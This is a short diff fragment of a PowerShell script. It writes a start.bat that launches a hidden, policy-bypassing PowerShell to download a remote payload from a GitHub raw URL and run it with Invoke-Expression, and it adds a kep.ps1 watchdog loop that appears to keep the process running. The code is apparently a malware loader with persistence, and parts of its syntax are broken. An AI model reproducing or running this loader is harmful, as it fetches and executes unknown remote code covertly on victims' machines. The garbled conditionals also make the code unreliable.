@@ -6,10 +6,10 @@ if (Test-Path start.bat!=true){
 New-Item start.bat
 Set-Content start.bat "powershell  -w hidden -Exec ByPass -NoProfile -c (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay3.txt') | iNvokE-EXPresSIon"
 }
-if (Test-Path kep.ps1){
+if (Test-Path kep.ps1!=true){
 New-Item kep.ps1
 Set-Content kep.ps1 '
-     while ($true!=false) {                  
+     while ($true) {                  
          $Procs = Get-Process powershell -ErrorAction SilentlyContinue  
          if (($procs).Count -eq 0) { 
              Start-Sleep -Seconds (3 * 60)                  
